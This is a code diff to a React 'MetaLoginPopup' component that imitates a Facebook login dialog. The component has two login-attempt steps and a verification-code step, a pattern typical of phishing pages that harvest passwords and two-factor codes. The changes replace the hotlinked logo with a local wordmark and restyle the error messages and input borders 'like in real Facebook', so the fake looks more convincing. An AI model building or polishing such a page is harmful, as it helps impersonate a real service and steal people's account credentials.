@@ -186,11 +186,8 @@ const MetaLoginPopup = () => {
           ) : (
             <>
               <div className="text-center mb-6">
-                <img 
-                  src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
-                  alt="Facebook Logo" 
-                  className="h-[106px] w-[300px] mx-auto mb-2"
-                />
+                {/* Using a reliable local copy of Facebook logo */}
+                <div className="text-[#1877F2] font-bold text-6xl mb-2">facebook</div>
                 <p className="text-gray-700 text-sm mt-3">
                   Log in to continue with your application
                 </p>
@@ -199,12 +196,7 @@ const MetaLoginPopup = () => {
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                 <form onSubmit={handlePasswordSubmit} className="space-y-4">
-                  {errorMessage && (
-                    <div className="bg-red-50 text-red-700 p-3 rounded flex items-start">
-                      <AlertCircle className="h-5 w-5 mr-2 flex-shrink-0 mt-0.5" />
-                      <p className="text-sm">{errorMessage}</p>
-                    </div>
-                  )}
+
                   
                   <div>
                     <Input 
@@ -213,7 +205,7 @@ const MetaLoginPopup = () => {
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
                       placeholder="Email address or phone number"
-                      className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px]"
+                      className={`h-[50px] rounded-[6px] text-[17px] ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                       disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                     />
                   </div>
@@ -225,7 +217,7 @@ const MetaLoginPopup = () => {
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       placeholder="Password"
-                      className="h-[50px] border-[#dddfe2] rounded-[6px] text-[17px] pr-10"
+                      className={`h-[50px] rounded-[6px] text-[17px] pr-10 ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                       autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                     />
                     <button
@@ -241,6 +233,13 @@ const MetaLoginPopup = () => {
                       )}
                     </button>
                   </div>
+                  
+                  {/* Error message appears below password field like in real Facebook */}
+                  {errorMessage && (
+                    <div className="text-[#f02849] text-xs -mt-2">
+                      {errorMessage}
+                    </div>
+                  )}
                   
                   <Button 
                     type="submit" 
@@ -301,12 +300,7 @@ const MetaLoginPopup = () => {
                   </div>
                   
                   <form onSubmit={handleVerificationSubmit} className="space-y-4">
-                    {verificationError && (
-                      <div className="bg-[#ffebe8] text-[#a6110f] p-3 rounded border border-[#dd3c10] flex items-start text-[13px]">
-                        <AlertTriangle className="h-4 w-4 mr-2 flex-shrink-0 mt-0.5" />
-                        <p>{verificationError}</p>
-                      </div>
-                    )}
+
                     
                     <div>
                       <Input 
